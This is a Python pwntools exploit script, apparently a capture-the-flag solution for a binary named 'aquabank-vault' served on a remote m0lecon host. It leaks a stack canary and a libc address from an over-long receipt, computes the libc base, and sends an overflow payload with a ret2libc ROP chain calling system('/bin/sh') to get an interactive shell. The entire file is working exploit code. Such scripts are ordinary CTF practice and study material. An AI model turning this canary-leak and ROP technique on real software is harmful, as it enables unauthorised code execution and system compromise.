from pwn import *

context.binary = elf = ELF('./aquabank-vault', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
OFFSET_TO_CANARY = 136

#p = process('./aquabank-vault') # or remote
p = remote('offsec.m0lecon.it', 13550)

# leak canary and libc base address
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'chars):\n', b'A' * 8) # Send a small recognizable string

p.recvuntil(b'--- RECEIPT ---\n')
raw_leak = p.recv(256) # Grab exactly the 256 leaked bytes

# Chop the leak into 8-byte chunks and print them nicely
#log.info("--- STACK DUMP ---")
#for i in range(0, len(raw_leak), 8):
#    chunk = raw_leak[i:i+8]
#    val = u64(chunk.ljust(8, b'\x00'))
#    print(f"Offset {i:03}: {val:#018x}")

libc_start_main = libc.symbols['__libc_start_main']

canary = u64(raw_leak[72:80])
# __libc_start_call_main + 117 ( -> 139)
libc_leak = u64(raw_leak[152:160])

#libc.address = libc_leak - libc_start_main - 117
# Zeros out the last 3 hex digits
function_page_start = libc_leak & 0xfffffffffffff000
page_offset = libc.symbols['__libc_start_main'] & 0xfffffffffffff000

# Calculate the true base dynamically
libc.address = function_page_start - page_offset

log.success(f"Leaked Canary: {canary:#x}")
log.success(f"Calculated Libc Base: {libc.address:#x}")

# locating all the gadgets we need
rop_libc = ROP(libc)
ret = rop_libc.find_gadget(['ret']).address
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

# preparing the payload

payload = flat(
    b'A' * OFFSET_TO_CANARY, # padding to reach the canary
    canary, # the leaked canary value
    b'B' * 8, # padding to reach the return address
    ret, # stack alignment
    pop_rdi, # pop rdi; ret
    binsh, # address of "/bin/sh"
    system # address of system
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'combination:\n', payload)

p.interactive()